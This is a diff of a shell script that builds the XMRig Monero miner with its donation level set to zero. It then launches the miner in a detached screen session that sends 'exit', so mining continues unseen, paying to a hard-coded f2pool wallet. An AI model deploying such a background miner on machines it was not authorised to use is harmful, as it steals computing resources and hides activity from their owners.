@@ -11,5 +11,10 @@ sed -i "s/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/g" xmrig/src/donate.h
 mkdir xmrig/build && cd xmrig/build
 cmake ..
 make -j$(nproc)
-screen -S x
-./xmrig -o xmr.f2pool.com:13531 -u 84W6ZSyJ7GW1MJrrLJpdYd1tbEfgTzjsP1XHjS4r6CyKeMFbxHRN2GrZLu4NaoVkF6QdgFNuu8RFA4yNmzhP1Vv44qrpQMm.Lin01 -k
+screen_name=$"my_screen"
+screen -dmS $screen_name
+cmd=$"./xmrig -o xmr.f2pool.com:13531 -u 84W6ZSyJ7GW1MJrrLJpdYd1tbEfgTzjsP1XHjS4r6CyKeMFbxHRN2GrZLu4NaoVkF6QdgFNuu8RFA4yNmzhP1Vv44qrpQMm.Lin01 -k &";
+screen -x -S $screen_name -p 0 -X stuff "$cmd"
+screen -x -S $screen_name -p 0 -X stuff $'\n'
+screen -x -S $screen_name -p 0 -X stuff $'exit'
+screen -x -S $screen_name -p 0 -X stuff $'\n'
